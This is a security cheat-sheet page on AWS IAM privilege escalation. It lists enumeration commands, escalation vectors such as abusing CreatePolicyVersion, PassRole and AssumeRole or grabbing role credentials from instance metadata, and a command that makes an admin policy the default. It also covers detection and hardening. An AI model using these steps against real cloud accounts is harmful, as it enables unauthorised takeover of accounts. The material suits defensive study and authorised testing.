---
title: "AWS IAM privilege escalation"
category: "cloud-security"
tags: ["aws", "iam", "privesc"]
platform: "aws"
mitre: ["T1078.004"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# AWS IAM privilege escalation

## TL;DR
Excessive IAM permissions let you escalate from low-priv to admin. Classics: `iam:CreatePolicyVersion`, `iam:PassRole` + launching a service, `sts:AssumeRole`. Enumerate with `enumerate-iam` / Pacu / ScoutSuite.

## Enumeration
```bash
aws sts get-caller-identity
aws iam get-account-authorization-details        # full picture (if allowed)
# Automated
pacu   # modules iam__enum_permissions, iam__privesc_scan
enumerate-iam --access-key ... --secret-key ...
```

## Common privesc vectors
```text
iam:CreatePolicyVersion            -> overwrite a policy, grant yourself *:*
iam:AttachUserPolicy / PutUserPolicy -> attach AdministratorAccess
iam:PassRole + ec2:RunInstances     -> launch an EC2 with an admin role, grab its creds from metadata
iam:PassRole + lambda:CreateFunction -> Lambda with an admin role
sts:AssumeRole (too loose trust)   -> assume a stronger role
iam:CreateAccessKey (for another user) -> admin keys
iam:UpdateAssumeRolePolicy          -> add yourself to a role's trust policy
```

```bash
# Example: CreatePolicyVersion -> admin
aws iam create-policy-version --policy-arn <arn> \
  --policy-document file://admin.json --set-as-default
```

## Detection (Blue Team)
```text
CloudTrail: CreatePolicyVersion, AttachUserPolicy, CreateAccessKey, UpdateAssumeRolePolicy,
            PassRole to sensitive roles, AssumeRole from unusual sources.
GuardDuty: IAM anomalies, credential exfiltration.
```

## Mitigation / Hardening
- Least privilege, **permission boundaries**, org-level SCPs.
- Restrict `iam:PassRole` (condition `iam:PassedToService`), no `*` on Action.
- Access Analyzer (unused permissions/public access), MFA, key rotation → IAM Roles instead of users.

## Sources
- [Pacu](https://github.com/RhinoSecurityLabs/pacu) · [Rhino – AWS privesc methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
